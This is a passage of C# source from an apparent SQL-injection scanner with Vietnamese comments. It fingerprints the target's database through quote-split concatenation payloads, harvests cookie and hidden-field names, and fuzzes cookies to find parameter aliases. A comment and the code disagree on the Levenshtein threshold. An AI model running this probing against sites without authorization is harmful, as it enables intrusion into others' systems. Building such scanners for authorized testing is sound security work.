            string str2 = originalValue.Substring(mid);

            char[] separators = { '\'', '"' };

            config.OnProgress?.Invoke($"[Concatenation] Đoán database bằng kĩ thuật nối chuỗi");

            foreach (char separator in separators)
            {
                if (config.Token.IsCancellationRequested) return "UNKNOWN";

                // Kiểm tra MySQL (Nối bằng khoảng trắng)
                // VD: adm' 'in
                string mysqlPayload = $"{str1}{separator} {separator}{str2}";
                if (await IsConcatenationMatchAsync(target, mysqlPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
                {
                    config.OnProgress?.Invoke($"[Concatenation] [MATCH] Nhận diện dấu hiệu của [MySQL] qua dấu nháy [{separator}].");
                    return "MySQL";
                }

                // Kiểm tra MSSQL (sử dụng '+')
                // VD: adm'+'in
                string mssqlPayload = $"{str1}{separator}+{separator}{str2}";
                if (await IsConcatenationMatchAsync(target, mssqlPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
                {
                    config.OnProgress?.Invoke($"[Concatenation] [MATCH] Nhận diện dấu hiệu của [MSSQL] qua dấu nháy [{separator}].");
                    return "MSSQL";
                }

                // Kiểm tra nhóm ANSI (Oracle, PostgreSQL, SQLite sử dụng toán tử '||')
                // VD: adm'||'in
                string ansiPayload = $"{str1}{separator}||{separator}{str2}";
                if (await IsConcatenationMatchAsync(target, ansiPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
                {
                    config.OnProgress?.Invoke($"[Concatenation] Khớp phép nối chuỗi ANSI (||) bằng dấu nháy [{separator}]. Đang chạy cây quyết định...");
                    // 1. Phân biệt Oracle bằng nối thêm NULL (vì orcal đối xử null như một chuỗi rỗng)
                    string oraclePayload = $"{str1}{separator}||NULL||{separator}{str2}";
                    if (await IsConcatenationMatchAsync(target, oraclePayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
                    {
                        return "Oracle";
                    }

                    // 2. Phân biệt PostgreSQL (sử dụng toán tử '::text' để ép kiểu)
                    string pgPayload = $"{str1}{separator}::text||{separator}{str2}";
                    if (await IsConcatenationMatchAsync(target, pgPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
                    {
                        return "PostgreSQL";
                    }

                    return "SQLite";
                }
            }

            return "UNKNOWN";
        }
        #endregion

        #region Thuật toán dò tìm Cookie & Aliasing
        // Trích xuất cookie thụ động: lấy cookie từ Set-Cookie headers, JavaScript DOM, và Form Hidden Inputs
        public HashSet<string> MinePassiveCookie(string html, HttpResponseHeaders? headers)
        {
            var cookies = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            // Phân tích Set-Cookie trong Http Response Headers
            if (headers != null && headers.TryGetValues("Set-Cookie", out var setCookieValues))
            {
                foreach (var header in setCookieValues)
                {
                    var parts = header.Split(';', StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length > 0)
                    {
                        var cookiePart = parts[0];
                        var equalIndex = cookiePart.IndexOf('=');
                        if (equalIndex > 0)
                        {
                            string key = cookiePart.Substring(0, equalIndex).Trim();
                            if (!string.IsNullOrEmpty(key)) cookies.Add(key);
                        }
                    }
                }
            }

            // Phân tích các thẻ Html
            var parser = new HtmlParser();
            using var document = parser.ParseDocument(html);

            var scripts = document.QuerySelectorAll("script");
            var cookieRegex = new Regex(@"document\.cookie\s*=\s*['""]([^=;'\s""]+)=", RegexOptions.IgnoreCase | RegexOptions.Compiled);

            foreach (var script in scripts)
            {
                string scriptContent = script.TextContent;
                if (string.IsNullOrEmpty(scriptContent)) continue;

                var matches = cookieRegex.Matches(scriptContent);
                foreach (Match match in matches)
                {
                    if (match.Groups.Count > 1)
                    {
                        string foundCookie = match.Groups[1].Value.Trim();
                        if (!string.IsNullOrEmpty(foundCookie)) cookies.Add(foundCookie);
                    }
                }
            }

            // Tìm các thẻ input hidden trong Form
            var hiddenInputs = document.QuerySelectorAll("input[type='hidden']");
            foreach (var input in hiddenInputs)
            {
                string name = input.GetAttribute("name") ?? "";
                if (!string.IsNullOrEmpty(name))
                {
                    cookies.Add(name.Trim());
                }
            }

            return cookies;
        }

        public async Task<HashSet<string>> MineActiveCookiesAsync(
            CrawlResult target,
            string originalHtml,
            string originalValue,
            int baselineStatus,
            int baselineLength,
            CancellationToken cancellationToken)
        {
            var discoveredActiveCookies = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            var baseWords = new List<string> { "id", "user", "role", "debug", "token", "session", "admin", "config", "mode", "key" };

            // Lấy thêm tên các tham số query, form vào danh sách
            foreach (var param in target.Params.Keys)
            {
                baseWords.Add(param);
            }
            var queryParams = System.Web.HttpUtility.ParseQueryString(target.RawQueryString);
            foreach (string? key in queryParams.AllKeys)
            {
                if (key != null) baseWords.Add(key);
            }

            var uniqueWords = baseWords.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
            const string canaryValue = "canaryFuzz123";

            foreach (var word in uniqueWords)
            {
                if (cancellationToken.IsCancellationRequested) break;

                var (fuzzHtml, fuzzBytes, fuzzStatus, _, _) = await _requestService.RequestAsync(
                    target,
                    payload: canaryValue,
                    new InjectionRoute(RouteType.Cookie, word, originalValue),
                    cancellationToken: cancellationToken
                );

                if (fuzzBytes == null) continue;
                double similarity = CalculateSimilarity(
                    baselineStatus, baselineLength, originalHtml,
                    fuzzStatus, fuzzBytes.Length, fuzzHtml,
                    target.PageTolerance
                );

                bool isReflected = fuzzHtml.Contains(canaryValue, StringComparison.OrdinalIgnoreCase);

                if (similarity < 0.95 || isReflected)
                {
                    discoveredActiveCookies.Add(word);
                }
            }
            return discoveredActiveCookies;
        }

        public async Task<InjectionRoute> CheckCookieAliasingAsync(
            CrawlResult target,
            string paramName,
            HashSet<string> minedCookies,
            CancellationToken cancellationToken)
        {
            var candidateCookies = GetPotentialCookieAliases(paramName, minedCookies);

            string originalValue = target.Params.TryGetValue(paramName, out var bodyVal)
                ? bodyVal
                : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[paramName] ?? "");

            string mutatedValue = int.TryParse(originalValue, out _) ? "999" : "mutated_state_check";
            // Request Baseline (Tham số gốc, không truyền cookie)
            var (baseHtml, baseBytes, baseStatus, _, _) = await _requestService.RequestAsync(
                target,
                originalValue,
                InjectionRoute.CreateStandard(paramName, originalValue),
                cancellationToken);

            if (baseBytes == null) return InjectionRoute.CreateStandard(paramName, originalValue);

            // Request Mutation (Tham số đột biến, không truyền Cookie)
            var (mutatedHtml, mutatedBytes, mutatedStatus, _, _) = await _requestService.RequestAsync(
                target,
                mutatedValue,
                InjectionRoute.CreateStandard(paramName, originalValue),
                cancellationToken);
            if (mutatedBytes == null) return InjectionRoute.CreateStandard(paramName, originalValue);

            double baselineVsMutation = CalculateSimilarity(
                baseStatus, baseBytes.Length, baseHtml,
                mutatedStatus, mutatedBytes.Length, mutatedHtml,
                target.PageTolerance
            );

            // Nếu không có sự thay đổi thì bỏ qua phân định
            if (baselineVsMutation > 0.98)
            {
                return InjectionRoute.CreateStandard(paramName, originalValue);
            }

            foreach (var cookieName in candidateCookies)
            {
                if (cancellationToken.IsCancellationRequested) break;

                // Request Conflict (Query/Form giữ nguyên giá trị Gốc, nhưng Cookie truyền giá trị Đột biến)
                var (conflictHtml, conflictBytes, conflictStatus, _, _) = await _requestService.RequestAsync(
                    target,
                    payload: mutatedValue,
                    new InjectionRoute(RouteType.Cookie, cookieName, originalValue),
                    cancellationToken: cancellationToken
                );

                if (conflictBytes == null) continue;

                // Kiểm tra việc thay đổi trên cookie có tương ứng với khi payload độc truyền vào tham số query/inputs hay không
                double conflictVsMutation = CalculateSimilarity(
                    mutatedStatus, mutatedBytes.Length, mutatedHtml,
                    conflictStatus, conflictBytes.Length, conflictHtml,
                    target.PageTolerance
                );

                double conflictVsBaseline = CalculateSimilarity(
                    baseStatus, baseBytes.Length, baseHtml,
                    conflictStatus, conflictBytes.Length, conflictHtml,
                    target.PageTolerance
                );

                // Nếu trang Conflict giống hệt trang Mutation (> 95%) và khác hẳn Baseline (< 90%): 
                // Điều đó chứng tỏ Server đã bỏ qua giá trị ở URL/Form và lấy trực tiếp giá trị từ Cookie!
                if (conflictVsMutation > 0.95 && conflictVsBaseline < 0.90)
                {
                    return new InjectionRoute(RouteType.Cookie, cookieName, originalValue);
                }
            }

            return InjectionRoute.CreateStandard(paramName, originalValue);
        }

        private List<string> GetPotentialCookieAliases(string paramName, HashSet<string> minedCookies)
        {
            var candidates = new List<string>();

            candidates.Add(paramName);

            if (minedCookies == null || minedCookies.Count == 0)
                return candidates.Distinct(StringComparer.OrdinalIgnoreCase).ToList();

            foreach (var cookie in minedCookies)
            {
                // Khớp chuỗi con (Substring)
                bool isSubstring = cookie.Contains(paramName, StringComparison.OrdinalIgnoreCase) ||
                                   paramName.Contains(cookie, StringComparison.OrdinalIgnoreCase);

                // Sai số chính tả (Levenshtein Distance <= 2)
                int distance = CalculateLevenshteinDistance(paramName, cookie);
                bool isTypo = distance <= 3;

                if (isSubstring || isTypo)
                {
                    candidates.Add(cookie);
                }
            }

            return candidates.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
        }
        #endregion
    }
}
